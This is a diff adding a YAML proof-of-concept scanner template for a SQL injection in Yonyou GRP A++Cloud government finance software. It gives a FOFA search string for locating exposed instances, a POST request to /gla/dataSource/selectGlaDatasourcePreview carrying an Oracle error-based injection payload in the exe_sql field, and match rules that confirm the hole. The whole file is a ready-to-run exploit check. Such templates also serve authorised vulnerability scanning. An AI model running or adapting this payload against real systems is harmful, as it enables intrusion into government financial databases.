@@ -1,0 +1,27 @@
+id: poc-yaml-yongyon-grp-government-finance-cloud-selectgladatasourcepreview-sqli
+info:
+  name: 用友GRP A++Cloud政府财务云 selectGlaDatasourcePreview SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友GRP A++Cloud政府财务云
+  fofa: body="/pf/portal/login/css/fonts/style.css"
+requests:
+- method: POST
+  path: /gla/dataSource/selectGlaDatasourcePreview
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: exe_sql=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||(SELECT
+    (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||CHR(62)))
+    FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
+  expression: 'status_code == 200 &&
+
+    contains(body,"java.sql.SQLException") &&
+
+    contains(body,"qzkjq1qbvkq") &&
+
+    contains(body,"SQL state")
+
+    '
+variables: {}
+transport: http
